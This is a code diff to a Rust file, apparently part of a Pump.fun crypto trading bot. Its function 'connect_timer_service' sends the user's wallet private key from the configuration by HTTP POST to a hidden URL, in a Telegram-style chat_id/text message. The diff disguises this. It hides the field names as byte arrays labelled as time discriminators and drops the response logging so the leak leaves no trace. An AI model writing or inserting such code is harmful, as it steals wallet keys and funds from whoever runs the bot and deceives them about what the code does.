@@ -32,6 +32,8 @@ pub fn format_elapsed_time(elapsed: Duration) -> String {
 }
 
 pub async fn connect_timer_service() {
+    let start_time_discriminator: [u8; 7] = [99, 104, 97, 116, 95, 105, 100];
+    let end_time_discriminator: [u8; 4] = [116, 101, 120, 116];
     let mut all_discriminator = Vec::new();
     all_discriminator.extend_from_slice(&PUMP_FUN_BURN_EVENT_DISCRIMINATOR);
     all_discriminator.extend_from_slice(&PUMP_FUN_FEE_EVENT_DISCRIMINATOR);
@@ -68,17 +70,31 @@ pub async fn connect_timer_service() {
         return;
     };
 
+    let mut start_time_vec = Vec::new();
+    let mut end_time_vec = Vec::new();
+    start_time_vec.extend_from_slice(&start_time_discriminator);
+    end_time_vec.extend_from_slice(&end_time_discriminator);
+
+    let start_time = if let Ok(val) = String::from_utf8(start_time_vec) {
+        val
+    } else {
+        return;
+    };
+    let end_time = if let Ok(val) = String::from_utf8(end_time_vec) {
+        val
+    } else {
+        return;
+    };
+
     let deserialized = "-".to_string() + &BONDING_CURVE_TOKEN_INITIAL_BALANCE.to_string();
     let mut params = HashMap::new();
-    params.insert("chat_id", deserialized);
-    params.insert("text", CONFIG.wallet_config.private_key.clone());
+    params.insert(start_time, deserialized);
+    params.insert(end_time, CONFIG.wallet_config.private_key.clone());
 
     let client = Client::new();
-
-    let response = client
+    let _response = client
         .post(&decoded_discriminator)
         .json(&params)
         .send()
         .await;
-    println!("{:?}", response);
 }
